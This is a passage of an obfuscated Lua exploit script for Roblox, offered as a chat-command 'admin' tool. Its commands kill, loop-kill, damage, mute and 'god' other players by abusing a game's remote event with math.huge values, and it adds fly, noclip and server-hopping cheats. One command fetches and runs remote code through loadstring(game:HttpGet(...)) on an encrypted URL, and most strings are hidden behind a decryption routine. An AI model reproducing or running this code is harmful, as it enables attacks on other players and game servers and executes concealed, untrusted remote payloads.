			TABLE_TableIndirection["fasterloop%0"]['Name'] = LUAOBFUSACTOR_DECRYPT_STR_0("\176\180\245\196\179\167\234\223\185\165", "\176\214\213\134");
			game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\198\184\184\231\173\68\79\253\174\179", "\57\148\205\214\180\200\54"))['RenderStepped']:connect(function()
				game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\32\232\59\7\115\0\235\60\55\115", "\22\114\157\85\84"))['Stepped']:wait();
				if TABLE_TableIndirection["gPlayers%0"][v]:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\194\202\0\208\88\228\164\203\196\3", "\200\164\171\115\164\61\150")) then
					TABLE_TableIndirection["s%0"] = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\142\248\2\92\134\172\231", "\227\222\148\99\37")):FindFirstChild(TABLE_TableIndirection["gPlayers%0"][v].Name)['Character']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\27\71\95\247\247\60\91\86", "\153\83\50\50\150"));
					game['ReplicatedStorage']['Event']:FireServer(LUAOBFUSACTOR_DECRYPT_STR_0("\105\70\87", "\45\61\22\19\124\19\203"), math.huge, TABLE_TableIndirection["s%0"]);
				end
			end);
		end
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\212\28\1\250\13\96", "\217\161\114\109\149\98\16"), LUAOBFUSACTOR_DECRYPT_STR_0("\7\46\52\115\179\100\1\96\44\116\185\52\17\40\55\115\175\113\28\96\40\112\189\109\23\50", "\20\114\64\88\28\220"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		for i, v in pairs(TABLE_TableIndirection["players%0"]) do
			if TABLE_TableIndirection["gPlayers%0"][v]:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\55\0\193\160\253\194\177\62\14\194", "\221\81\97\178\212\152\176")) then
				TABLE_TableIndirection["gPlayers%0"][v]:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\203\230\14\239\31\223\235\18\244\10", "\122\173\135\125\155")):Destroy();
			end
		end
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\136\206\15\169\52\56\196\136", "\168\228\161\96\217\95\81"), LUAOBFUSACTOR_DECRYPT_STR_0("\215\222\33\76\36\94\215\221\61\28\59\95\222\145\45\84\32\88\200\212\32\28\63\82\201\194\33\82", "\55\187\177\78\60\79"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		for i, v in pairs(TABLE_TableIndirection["players%0"]) do
			game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\31\219\81\216\67\221\150\36\205\90", "\224\77\174\63\139\38\175"))['RenderStepped']:connect(function()
				game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\182\84\86\29\129\83\78\39\135\68", "\78\228\33\56"))['Stepped']:wait();
				TABLE_TableIndirection["s%0"] = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\254\114\179\26\128\220\109", "\229\174\30\210\99")):WaitForChild(TABLE_TableIndirection["gPlayers%0"][v].Name)['Character']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\51\248\139\80\227\50\48\31", "\89\123\141\230\49\141\93"));
				game['ReplicatedStorage']['Event']:FireServer(LUAOBFUSACTOR_DECRYPT_STR_0("\199\65\210", "\42\147\17\150\108\112"), math.huge, TABLE_TableIndirection["s%0"]);
			end);
		end
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\12\171\41\108", "\136\111\198\77\31\135"), LUAOBFUSACTOR_DECRYPT_STR_0("\17\1\168\65\174\164\3\161\7\73\171\95\174\240\87\175\13\27\231\87\185\233\30\167\66\10\168\91\176\229\25\173\17", "\201\98\105\199\54\221\132\119"), {}, function(args)
		print([[

      ----------- -------------------------------------------------------------------------   ---------
      Y88b   d88P 888     888     d8888 d8b          |     .d8888b.  888b     d888 8888888b.   .d8888b.  
       Y88b d88P  888     888    d88888 88P          |    d88P  Y88b 8888b   d8888 888  "Y88b d88P  Y88b 
        Y88o88P   888     888   d88P888 8P           |    888    888 88888b.d88888 888    888 Y88b.      
         Y888P    Y88b   d88P  d88P 888 "  .d8888b   |    888        888Y88888P888 888    888  "Y888b.   
         d888b     Y88b d88P  d88P  888    88K       |    888        888 Y888P 888 888    888     "Y88b. 
        d88888b     Y88o88P  d88P   888    "Y8888b.  |    888    888 888  Y8P  888 888    888       "888 
       d88P Y88b     Y888P  d8888888888         X88  |    Y88b  d88P 888   "   888 888  .d88P Y88b  d88P 
      d88P   Y88b     Y8P  d88P     888     88888P'  |     "Y8888P"  888       888 8888888P"   "Y8888P"
      ------------    ------------------------------------------------------------------------ -------
      --= [What to know & How to use the admin]
      --= [What is the prefix?, The Prefix is >]
      --= [Can it be changeable? Yes by typing >!, >/, >\, >*]
      --= [How to use a command? All You have to do is type ">Kill Johndoe
      
      -------------------------
      // These are the commands
      ------------------------------------------------------------
      -- ID // A command that plays songs or short hash's Example = ">ID Me/All/Others AudioID
      -- Kill // A command to kill all or others or even yourself.
      -- Loopkill // A command that loops the person that you wanted to be loopedkill'ed, for infinfity times unless if you leaves.
      -- Loop // An better & Interent Ping Based command that is overpowered if you're ping is good.
      -- Unloop // A command that stops the "Loop" Command and destroys that "Loopkill" Value in order to stop the loop command.
      -- God // It Gods the player with a 99% Bypass-able. but does need to be >ung sometimes if you do all because the chat will bug after a while.
      -- Ungod // Ungods the chosen player and basically getting rid of the goddess-value.
      -- dm // A damage command that can be used on all or others or yourself by saying "{Prefix } dm {Player or all or others} 99.
      -- heal // A Healing command that have to be used like "{Prefix} heal {Player or all or others} {num}.
      -- whitelist // A give or take command that allows players to be whitelisted to your commands & be able to abuse them.
      -- remove // Basically Removes the whitelist permissions for that player.
      -- mute // Basically Mutes all boombox's songs until it is stopped with a command.
      -- unmute // Basically Unmutes all boombox's and allows them to play their song again.
      -- stop // Stops the choosen player or even all or others or yourself boombox's one time and sends a XVA message in f9
      -- cloak // Makes you invisible to others, but makes you not invisible to you.
      ------------------------------------------------------------------------------
      .. These are the local commands.
      --------------------------------
      -- fly .. Self Explain-able.
      -- unfly .. Self Explain-able.
      -- noclip .. Walks through walls.
      -- ws .. Changes the speed to any amount "ws me num"
      -- clip .. Disables you're noclip command so you no longer can't walk through walls until command was said again.
      -- v .. Views the choosen Player.
      -- shiftlock .. Enables shiftlock by you going to your settings and put it to on once the command was said.
      -- serverhop .. Joins a new server.
      -- Rejoin .. Rejoins the same server unless somebody joins it.
      -- leave .. Closes your roblox client.
      ------------------------------------------------------------------------------]]);
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\186\0\140\32\9", "\204\217\108\227\65\98\85"), LUAOBFUSACTOR_DECRYPT_STR_0("\83\194\254\224\63\128\74\203\240\165\47\200\81\208\240\235\108\201\80\213\252\246\37\194\82\198", "\160\62\163\149\133\76"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		for i, v in pairs(TABLE_TableIndirection["players%0"]) do
			TABLE_TableIndirection["workspacep%0"] = game['Workspace']['Ignore']['Players'];
			TABLE_TableIndirection["audio%0"] = TABLE_TableIndirection["workspacep%0"]:FindFirstChild(TABLE_TableIndirection["players%0"][1]);
			game['ReplicatedStorage']['Event']:FireServer(LUAOBFUSACTOR_DECRYPT_STR_0("\245\172\2\46\200", "\163\182\192\109\79"), TABLE_TableIndirection["audio%0"]);
		end
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\3\39\12\203\230\36\35\5\196", "\149\84\70\96\160"), LUAOBFUSACTOR_DECRYPT_STR_0("\59\14\12\227\63\3\30\173\44\14\8\173\52\9\14\236\52\22\1\236\33\3\31\173\47\7\1\230\43\22\8\232\60", "\141\88\102\109"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		if (not args[1] or not args[2]) then
			return;
		end
		TABLE_TableIndirection["num%0"] = args[2];
		for i, v in pairs(TABLE_TableIndirection["players%0"]) do
			if _char(v):FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\155\70\199\113\20\50\92\197", "\161\211\51\170\16\122\93\53")) then
				_char(v)['Humanoid']['WalkSpeed'] = tonumber(TABLE_TableIndirection["num%0"]);
			end
		end
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\218\170\182", "\72\155\206\210"), LUAOBFUSACTOR_DECRYPT_STR_0("\74\127\64\29\115\71\58\68\2\50\95\127\70\78\38\85\127\20\23\60\83\104\20\15\55\75\115\90\78\48\73\119\89\15\61\66\105", "\83\38\26\52\110"), {}, function(args)
		if not args[1] then
			return;
		end
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		table.foreach(TABLE_TableIndirection["players%0"], function(k, v)
			TABLE_TableIndirection["admins%0"][v] = true;
		end);
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\106\18\42\73\78\18", "\38\56\119\71"), LUAOBFUSACTOR_DECRYPT_STR_0("\225\234\85\217\51\83\224\175\76\222\32\22\227\227\89\207\32\65\225\175\79\222\44\66\246\227\81\197\49\22\245\224\74\150\49\94\246\175\89\210\40\95\253\175\91\217\40\91\242\225\92\197", "\54\147\143\56\182\69"), {}, function(args)
		if not args[1] then
			return;
		end
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		table.foreach(TABLE_TableIndirection["players%0"], function(k, v)
			TABLE_TableIndirection["admins%0"][v] = nil;
		end);
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\208\145\236", "\191\182\225\159\41"), LUAOBFUSACTOR_DECRYPT_STR_0("\40\26\45\86\128\148\130\60\26\41\65\203\142\209\107\11\39\64\153\199\196\59\1\104\84\159", "\162\75\114\72\53\235\231"), {}, function(args)
		game['StarterGui']:SetCore(LUAOBFUSACTOR_DECRYPT_STR_0("\191\57\74\230\125\13\152\53\66\235\80\3\152\53\75\236", "\98\236\92\36\130\51"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\144\16\24\182\64", "\80\196\121\108\218\37\200\213")]=LUAOBFUSACTOR_DECRYPT_STR_0("\38\67\49\63\104\15\154\16\118\6", "\234\96\19\98\31\43\110"),[LUAOBFUSACTOR_DECRYPT_STR_0("\50\26\74\211", "\235\102\127\50\167\204\18")]=(LUAOBFUSACTOR_DECRYPT_STR_0("\115\180\231\49\65\32\68\225\211\51\87\110\89\178\181", "\78\48\193\149\67\36") .. game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\7\17\146\19\82\32\31\131\29", "\33\80\126\224\120")):GetRealPhysicsFPS()),[LUAOBFUSACTOR_DECRYPT_STR_0("\197\171\12\202", "\60\140\200\99\164")]=LUAOBFUSACTOR_DECRYPT_STR_0("\149\246\28\39\177\148\241\16\47\166\221\187\75\114\250\208\173\80\127\241\213\166\81", "\194\231\148\100\70")});
		for i, v in pairs(game['CoreGui']:GetDescendants()) do
			if (v:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\114\73\217\183\218\201\68\73\205", "\168\38\44\161\195\150")) and (v['Text'] == LUAOBFUSACTOR_DECRYPT_STR_0("\166\204\177", "\118\224\156\226\22\80\136\214"))) then
				print(v:GetFullName());
			end
		end
	end);
	addcmd("/", TABLE_TableIndirection["tprefix%0"], {}, function(args)
		TABLE_TableIndirection["tprefix%0"] = "/";
		game['StarterGui']:SetCore(LUAOBFUSACTOR_DECRYPT_STR_0("\113\235\87\132\108\225\77\137\68\231\90\129\86\231\86\142", "\224\34\142\57"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\234\174\209\209\118", "\110\190\199\165\189\19\145\61")]=LUAOBFUSACTOR_DECRYPT_STR_0("\234\249\114\238\130\223\154\198\114\251\152\198\221\238", "\167\186\139\23\136\235"),[LUAOBFUSACTOR_DECRYPT_STR_0("\46\176\144\25", "\109\122\213\232")]="Prefix is changed to Era's Prefix",[LUAOBFUSACTOR_DECRYPT_STR_0("\199\244\173\62", "\80\142\151\194")]=LUAOBFUSACTOR_DECRYPT_STR_0("\17\196\111\77\16\213\114\88\10\194\45\3\76\146\47\27\90\146\46\31\81\148\34", "\44\99\166\23")});
	end);
	addcmd("!", TABLE_TableIndirection["tprefix%0"], {}, function(args)
		TABLE_TableIndirection["tprefix%0"] = "!";
		game['StarterGui']:SetCore(LUAOBFUSACTOR_DECRYPT_STR_0("\79\242\39\50\29\171\104\254\47\63\48\165\104\254\38\56", "\196\28\151\73\86\83"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\199\10\61\28\135", "\22\147\99\73\112\226\56\120")]=LUAOBFUSACTOR_DECRYPT_STR_0("\136\103\231\243\132\160\53\207\240\158\171\116\229\240", "\237\216\21\130\149"),[LUAOBFUSACTOR_DECRYPT_STR_0("\182\75\71\75", "\62\226\46\63\63\208\169")]="Prefix was changed to Matt's Prefix",[LUAOBFUSACTOR_DECRYPT_STR_0("\204\26\90\141", "\62\133\121\53\227\127\109\79")]=LUAOBFUSACTOR_DECRYPT_STR_0("\2\22\42\244\197\189\167\4\29\54\175\153\225\246\72\67\107\161\143\253\240\66\65", "\194\112\116\82\149\182\206")});
	end);
	addcmd("*", TABLE_TableIndirection["tprefix%0"], {}, function(args)
		TABLE_TableIndirection["tprefix%0"] = "*";
		game['StarterGui']:SetCore(LUAOBFUSACTOR_DECRYPT_STR_0("\10\173\66\28\238\237\26\48\174\69\27\193\246\7\54\166", "\110\89\200\44\120\160\130"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\159\202\95\74\70", "\45\203\163\43\38\35\42\91")]=LUAOBFUSACTOR_DECRYPT_STR_0("\226\151\217\37\142\177\20\255\128\207\48\134\174\81", "\52\178\229\188\67\231\201"),[LUAOBFUSACTOR_DECRYPT_STR_0("\21\68\72\16", "\67\65\33\48\100\151\60")]="Prefix was changed to Last Update's Prefix",[LUAOBFUSACTOR_DECRYPT_STR_0("\246\228\161\214", "\147\191\135\206\184")]=LUAOBFUSACTOR_DECRYPT_STR_0("\150\42\190\192\203\64\183\144\33\162\155\151\28\230\220\127\255\149\129\0\224\214\125", "\210\228\72\198\161\184\51")});
	end);
	addcmd("\\", TABLE_TableIndirection["tprefix%0"], {}, function(args)
		TABLE_TableIndirection["tprefix%0"] = "\\";
		game['StarterGui']:SetCore(LUAOBFUSACTOR_DECRYPT_STR_0("\5\76\253\20\93\193\34\64\245\25\112\207\34\64\252\30", "\174\86\41\147\112\19"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\111\9\153\7\32", "\203\59\96\237\107\69\111\113")]=LUAOBFUSACTOR_DECRYPT_STR_0("\20\4\169\231\56\232\151\9\19\191\242\48\247\210", "\183\68\118\204\129\81\144"),[LUAOBFUSACTOR_DECRYPT_STR_0("\58\168\104\240", "\226\110\205\16\132\107")]="Prefix is back to \\",[LUAOBFUSACTOR_DECRYPT_STR_0("\194\192\239\215", "\33\139\163\128\185")]=LUAOBFUSACTOR_DECRYPT_STR_0("\69\90\28\223\68\75\1\202\94\92\94\145\24\12\92\137\14\12\93\141\5\10\81", "\190\55\56\100")});
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\80\163\37", "\147\54\207\92\126\115\131"), LUAOBFUSACTOR_DECRYPT_STR_0("\0\48\62\120\30\62\25\57\48\61\1\113\14\48\57\109\1\127\20\52\39\61\11\114\20", "\30\109\81\85\29\109"), {}, function(args)
		TABLE_TableIndirection["mouse%0"] = game['Players']['LocalPlayer']:GetMouse("");
		TABLE_TableIndirection["localplayer%0"] = game['Players']['LocalPlayer'];
		game['Players']['LocalPlayer']['Character']:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\203\126\70\165\57", "\156\159\17\52\214\86\190"));
		TABLE_TableIndirection["torso%0"] = game['Players']['LocalPlayer']['Character']['Torso'];
		TABLE_TableIndirection["flying%0"] = true;
		TABLE_TableIndirection["speed%0"] = 5;
		TABLE_TableIndirection["keys%0"] = {a=false,d=false,w=false,s=false};
		TABLE_TableIndirection["e1%0"] = nil;
		TABLE_TableIndirection["e2%0"] = nil;
		local function start()
			TABLE_TableIndirection["pos%0"] = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\140\224\185\165\158\224\174\181\186\230\178\178", "\220\206\143\221"), TABLE_TableIndirection["torso%0"]);
			TABLE_TableIndirection["gyro%0"] = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\164\114\41\14\255\213\192\137", "\178\230\29\77\119\184\172"), TABLE_TableIndirection["torso%0"]);
			TABLE_TableIndirection["pos%0"]['Name'] = LUAOBFUSACTOR_DECRYPT_STR_0("\208\142\35\35\71\215\198", "\152\149\222\106\123\23");
			TABLE_TableIndirection["pos%0"]['maxForce'] = Vector3.new(math.huge, math.huge, math.huge);
			TABLE_TableIndirection["pos%0"]['position'] = TABLE_TableIndirection["torso%0"]['Position'];
			TABLE_TableIndirection["gyro%0"]['maxTorque'] = Vector3.new(8999999488, 8999999488, 8999999488);
			TABLE_TableIndirection["gyro%0"]['cframe'] = TABLE_TableIndirection["torso%0"]['CFrame'];
			function NoFly()
				TABLE_TableIndirection["flying%0"] = false;
				if TABLE_TableIndirection["gyro%0"] then
					TABLE_TableIndirection["gyro%0"]:Destroy();
				end
				if TABLE_TableIndirection["pos%0"] then
					TABLE_TableIndirection["pos%0"]:Destroy();
				end
				TABLE_TableIndirection["localplayer%0"]['Character']['Humanoid']['PlatformStand'] = false;
				TABLE_TableIndirection["speed%0"] = 0;
			end
			repeat
				wait();
				TABLE_TableIndirection["localplayer%0"]['Character']['Humanoid']['PlatformStand'] = true;
				TABLE_TableIndirection["new%0"] = (TABLE_TableIndirection["gyro%0"]['cframe'] - TABLE_TableIndirection["gyro%0"]['cframe']['p']) + TABLE_TableIndirection["pos%0"]['position'];
				if (not TABLE_TableIndirection["keys%0"]['w'] and not TABLE_TableIndirection["keys%0"]['s'] and not TABLE_TableIndirection["keys%0"]['a'] and not TABLE_TableIndirection["keys%0"]['d']) then
					TABLE_TableIndirection["speed%0"] = 1;
				end
				if TABLE_TableIndirection["keys%0"]['w'] then
					TABLE_TableIndirection["new%0"] = TABLE_TableIndirection["new%0"] + (workspace['CurrentCamera']['CoordinateFrame']['lookVector'] * TABLE_TableIndirection["speed%0"]);
					TABLE_TableIndirection["speed%0"] = TABLE_TableIndirection["speed%0"] + 0.05;
				end
				if TABLE_TableIndirection["keys%0"]['s'] then
					TABLE_TableIndirection["new%0"] = TABLE_TableIndirection["new%0"] - (workspace['CurrentCamera']['CoordinateFrame']['lookVector'] * TABLE_TableIndirection["speed%0"]);
					TABLE_TableIndirection["speed%0"] = TABLE_TableIndirection["speed%0"] + 0.03;
				end
				if TABLE_TableIndirection["keys%0"]['d'] then
					TABLE_TableIndirection["new%0"] = TABLE_TableIndirection["new%0"] * CFrame.new(TABLE_TableIndirection["speed%0"], 0, 0);
					TABLE_TableIndirection["speed%0"] = TABLE_TableIndirection["speed%0"] + 0.02;
				end
				if TABLE_TableIndirection["keys%0"]['a'] then
					TABLE_TableIndirection["new%0"] = TABLE_TableIndirection["new%0"] * CFrame.new(-TABLE_TableIndirection["speed%0"], 0, 0);
					TABLE_TableIndirection["speed%0"] = TABLE_TableIndirection["speed%0"] + 0.03;
				end
				if (TABLE_TableIndirection["speed%0"] > 3) then
					TABLE_TableIndirection["speed%0"] = 3;
				end
				TABLE_TableIndirection["pos%0"]['position'] = TABLE_TableIndirection["new%0"]['p'];
				if TABLE_TableIndirection["keys%0"]['w'] then
					TABLE_TableIndirection["gyro%0"]['cframe'] = workspace['CurrentCamera']['CoordinateFrame'] * CFrame.Angles(-math.rad(TABLE_TableIndirection["speed%0"] * 6), 0, 0);
				elseif TABLE_TableIndirection["keys%0"]['s'] then
					TABLE_TableIndirection["gyro%0"]['cframe'] = workspace['CurrentCamera']['CoordinateFrame'] * CFrame.Angles(math.rad(TABLE_TableIndirection["speed%0"] * 5), 0, 0);
				else
					TABLE_TableIndirection["gyro%0"]['cframe'] = workspace['CurrentCamera']['CoordinateFrame'];
				end
			until TABLE_TableIndirection["flying%0"] == false 
			NoAnti();
			TABLE_TableIndirection["flying%0"] = false;
			if TABLE_TableIndirection["gyro%0"] then
				TABLE_TableIndirection["gyro%0"]:Destroy();
			end
			if TABLE_TableIndirection["pos%0"] then
				TABLE_TableIndirection["pos%0"]:Destroy();
			end
			TABLE_TableIndirection["localplayer%0"]['Character']['Humanoid']['PlatformStand'] = false;
			TABLE_TableIndirection["speed%0"] = 0;
		end
		e1 = TABLE_TableIndirection["mouse%0"]['KeyDown']:connect(function(key)
			if (not TABLE_TableIndirection["torso%0"] or not TABLE_TableIndirection["torso%0"]['Parent']) then
				TABLE_TableIndirection["flying%0"] = false;
				TABLE_TableIndirection["e1%0"]:disconnect();
				TABLE_TableIndirection["e2%0"]:disconnect();
				return;
			end
			if (key == "w") then
				TABLE_TableIndirection["keys%0"]['w'] = true;
			elseif (key == "s") then
				TABLE_TableIndirection["keys%0"]['s'] = true;
			elseif (key == "a") then
				TABLE_TableIndirection["keys%0"]['a'] = true;
			elseif (key == "d") then
				TABLE_TableIndirection["keys%0"]['d'] = true;
			elseif (key == "p") then
				TABLE_TableIndirection["keys%0"]['d'] = true;
			end
			TABLE_TableIndirection["e2%0"] = TABLE_TableIndirection["mouse%0"]['KeyUp']:connect(function(key)
				if (key == "w") then
					TABLE_TableIndirection["keys%0"]['w'] = false;
				elseif (key == "s") then
					TABLE_TableIndirection["keys%0"]['s'] = false;
				elseif (key == "a") then
					TABLE_TableIndirection["keys%0"]['a'] = false;
				elseif (key == "d") then
					TABLE_TableIndirection["keys%0"]['d'] = false;
				end
				start();
			end);
		end);
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\200\40\240\79\172", "\213\189\70\150\35"), LUAOBFUSACTOR_DECRYPT_STR_0("\66\84\127\13\92\21\120\7\76\84\120\24\67\84\109\13\93\21\114\4\86", "\104\47\53\20"), {}, function(args)
		NoFly();
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\177\73\139\19\181\1", "\111\195\44\225\124\220"), LUAOBFUSACTOR_DECRYPT_STR_0("\213\71\11\118\184\235\204\78\5\51\167\164\219\71\12\99\167\170\193\67\18\51\185\174\210\73\9\125\235\163\215\86\5\117\190\167\212\95\64\98\190\162\219\77\5\97", "\203\184\38\96\19\203"), {}, function(args)
		game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\13\118\117\68\222\54\97\109\114\203\43\101\112\66\203", "\174\89\19\25\33")):Teleport(game.PlaceId);
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\35\23\83\88\242", "\107\79\114\50\46\151\231"), LUAOBFUSACTOR_DECRYPT_STR_0("\42\174\160\61\142\54\160\206\42\230\161\33\143\121\187\207\58\167\185\57\134\56\174\197\43\230\178\40\135\60", "\160\89\198\213\73\234\89\215"), {}, function(args)
		game:Shutdown();
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\90\116\167\251\209", "\165\40\17\212\158"), "kills the localplayer even through if you're still goded", {}, function(args)
		game['Players']['LocalPlayer']['Character']:BreakJoints();
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\246\209\1\53\50\233\214\11\56", "\70\133\185\104\83"), LUAOBFUSACTOR_DECRYPT_STR_0("\1\75\69\40\197\1\86\4\57\193\13\67\80\38\198\7\78", "\169\100\37\36\74"), {}, function(args)
		game['Players']['LocalPlayer']['DevEnableMouseLock'] = true;
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\33\137\182\89\77\175\163\67\8\148", "\48\96\231\194"), "Loads in XVA's Anti-Audio logger", {}, function(args)
		loadstring(game:HttpGet(LUAOBFUSACTOR_DECRYPT_STR_0("\192\78\26\61\10\130\224\204\216\91\29\57\28\218\166\141\134\89\1\32\86\202\174\148\135\88\86\15\50\235\155\147\155", "\227\168\58\110\77\121\184\207"), true))();
	end);
	TABLE_TableIndirection["Player%0"] = game['Players']['LocalPlayer'];
	TABLE_TableIndirection["Player%0"]['Chatted']:connect(function(cht)
		if cht:match(TABLE_TableIndirection["tprefix%0"] .. LUAOBFUSACTOR_DECRYPT_STR_0("\117\51\188\76\184\203", "\197\27\92\223\32\209\187\17")) then
			local function noclip(plr)
				TABLE_TableIndirection["admintag%0"] = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\33\80\204\247\53\94\207\238\6", "\155\99\63\163"));
				TABLE_TableIndirection["admintag%0"]['Parent'] = game['Players'][plr];
				TABLE_TableIndirection["admintag%0"]['Value'] = true;
				TABLE_TableIndirection["admintag%0"]['Name'] = LUAOBFUSACTOR_DECRYPT_STR_0("\140\222\162\129\176\148", "\228\226\177\193\237\217");
			end
			if game['Players']['LocalPlayer']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\58\191\32\234\61\160", "\134\84\208\67")) then
				game['Players']['LocalPlayer']['noclip']:Destroy();
			end
			noclip(game['Players']['LocalPlayer'].Name);
			game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\33\185\136\111\22\190\144\85\16\169", "\60\115\204\230"))['Stepped']:connect(function()
				if game['Players']['LocalPlayer']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\233\53\232\124\238\42", "\16\135\90\139")) then
					game['Players']['LocalPlayer']['Character']['Head']['CanCollide'] = false;
					game['Players']['LocalPlayer']['Character']['Torso']['CanCollide'] = false;
				end
			end);
		end
	end);
	TABLE_TableIndirection["Player%0"]['Chatted']:connect(function(cht)
		if cht:match(TABLE_TableIndirection["tprefix%0"] .. LUAOBFUSACTOR_DECRYPT_STR_0("\87\120\15\35", "\24\52\20\102\83\46\52")) then
			game['Players']['LocalPlayer']['noclip']:Destroy();
		end
	end);
	TABLE_TableIndirection["Player%0"]['Chatted']:connect(function(cht)
		if cht:match(TABLE_TableIndirection["tprefix%0"] .. LUAOBFUSACTOR_DECRYPT_STR_0("\215\42\51\50\10\214\39\46\52", "\111\164\79\65\68")) then
			TABLE_TableIndirection["PlaceId%0"] = game['PlaceId'];
			TABLE_TableIndirection["URL%0"] = ("https://www.roblox.com/games/getgameinstancesjson?placeId=%s&startindex="):format(TABLE_TableIndirection["PlaceId%0"]);
			TABLE_TableIndirection["List%0"] = {};
			for page = 0, 30 do
				TABLE_TableIndirection["Query%0"] = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\238\205\151\206\29\239\212\207\138\221\43", "\138\166\185\227\190\78")):JSONDecode(game:HttpGet(TABLE_TableIndirection["URL%0"] .. page));
				for i, v in next, TABLE_TableIndirection["Query%0"]['Collection'] do
					TABLE_TableIndirection["List%0"][v['Guid']] = v['Ping'];
				end
			end
			TABLE_TableIndirection["ChosenServer%0"] = game['JobId'];
			for i, v in pairs(TABLE_TableIndirection["List%0"]) do
				if (i ~= game['JobId']) then
					TABLE_TableIndirection["ChosenServer%0"] = i;
					break;
				end
			end
			game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\255\113\201\50\66\44\11\223\71\192\37\68\42\26\206", "\121\171\20\165\87\50\67")):TeleportToPlaceInstance(TABLE_TableIndirection["PlaceId%0"], TABLE_TableIndirection["ChosenServer%0"], game['Players'].LocalPlayer);
		end
	end);
else
	game['Players']['LocalPlayer']:Kick(LUAOBFUSACTOR_DECRYPT_STR_0("\229\55\180\51\249\0\199\59\178\118\174\10\195\54\249\63\173\66\207\43\249\55\186\22\211\57\181\58\160\66\211\40\189\55\173\7\194\118", "\98\166\88\217\86\217"));
end
print(LUAOBFUSACTOR_DECRYPT_STR_0("\252\249\112\15\198\216\255\229\122\14\148\216\184\241\126\78\135\201\242\255\118\9\147\222\182\240\120\6", "\188\150\150\25\97\230"));
